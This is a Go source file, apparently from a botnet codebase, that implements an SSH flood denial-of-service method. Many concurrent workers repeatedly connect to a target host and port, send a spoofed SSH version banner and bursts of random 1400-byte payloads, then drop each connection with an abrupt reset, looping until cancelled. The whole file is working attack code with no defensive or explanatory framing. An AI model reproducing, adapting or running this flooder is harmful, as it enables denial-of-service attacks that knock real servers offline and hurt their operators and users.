package l4

import (
	"context"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

var sshBanners = []string{
	"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3",
	"SSH-2.0-OpenSSH_9.2p1 Debian-2",
	"SSH-2.0-OpenSSH_7.4",
	"SSH-2.0-OpenSSH_9.7",
	"SSH-2.0-dropbear_2022.83",
	"SSH-2.0-libssh_0.10.5",
	"SSH-1.99-OpenSSH_8.0",
	"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13",
	"SSH-2.0-Openssh_4.3",
}

func Sshflood(ctx context.Context, target, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	workers := methods.Workers()

	for w := 0; w < workers; w++ {
		go func() {
			rng := methods.NewXorShift64()
			var bufs [16][]byte
			for i := range bufs {
				bufs[i] = make([]byte, 1400)
				rng.Fill(bufs[i])
			}
			idx := uint64(0)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				con, err := net.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}

				banner := sshBanners[int(rng.Uint64()%uint64(len(sshBanners)))]
				con.Write([]byte(banner + "\r\n"))

				bursts := 10 + int(rng.Uint64()%40)
				for j := 0; j < bursts; j++ {
					if _, err := con.Write(bufs[idx%16]); err != nil {
						break
					}
					idx++
				}

				if tcp, ok := con.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				}
				con.Close()
			}
		}()
	}
	<-ctx.Done()
}
